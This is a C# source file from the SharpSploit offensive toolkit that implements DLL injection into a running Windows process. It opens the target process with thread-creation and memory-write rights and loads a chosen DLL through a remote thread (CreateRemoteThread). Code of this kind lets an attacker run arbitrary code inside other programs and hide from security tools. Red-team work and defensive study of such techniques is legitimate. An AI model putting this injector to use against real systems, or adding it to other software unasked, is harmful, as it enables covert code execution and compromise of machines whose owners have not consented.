using System;
using System.Diagnostics;
using System.IO;
using SharpSploit.Core;
using SharpSploit.DLLInjection.Methods;

namespace SharpSploit.DLLInjection
{
    public class Injector
    {
        private InjectorMethod _injectorMethod;

        private Injector(InjectorMethod method)
        {
            _injectorMethod = method;
        }

        public static Injector Factory(InjectorType injectorType)
        {
            switch (injectorType)
            {
                case InjectorType.CREATE_REMOTE_THREAD:
                    return new Injector(new CreateRemoteThreadMethod());

                // case InjectorType.NT_CREATE_THREAD_EX:
                    //return new Injector(new NtCreateThreadExInjectionMethod());

                default:
                    throw new NotSupportedException(string.Format("Unsupported injection method: {0}", injectorType));
            }
        }

        public void Inject(Process proc, FileInfo dll)
        {
            // check args
            if (!proc.Responding)
                throw new ArgumentException(string.Format("Process {0} not responding", proc.Id));
            if (!dll.Exists)
                throw new ArgumentException(string.Format("Cannot access DLL: '{0}'", dll.FullName));

            // TODO: InjectorOptions
            //injectionOptions = injectionOptions ?? InjectionOptions.Defaults;

            // open process handle
            IntPtr hProcess = WinAPI.OpenProcess(
                WinAPI.ProcessAccessFlags.CreateThread |
                WinAPI.ProcessAccessFlags.QueryInformation |
                WinAPI.ProcessAccessFlags.VirtualMemoryOperation |
                WinAPI.ProcessAccessFlags.VirtualMemoryRead |
                WinAPI.ProcessAccessFlags.VirtualMemoryWrite,
                bInheritHandle: false,
                processId: proc.Id);

            Logger.CheckError(hProcess == IntPtr.Zero, "Cannot open process with PID: {0}", proc.Id);

            Logger.Info("Injecting...");
            IntPtr hThread = _injectorMethod.InjectHandle(hProcess, dll);

            Logger.CheckError(hThread == IntPtr.Zero, "Cannot create remote thread using CreateRemoteThread method");

            // TODO: handle wait and free here

            // clean up
            WinAPI.CloseHandle(hThread);
            WinAPI.CloseHandle(hProcess);
        }
    }
}
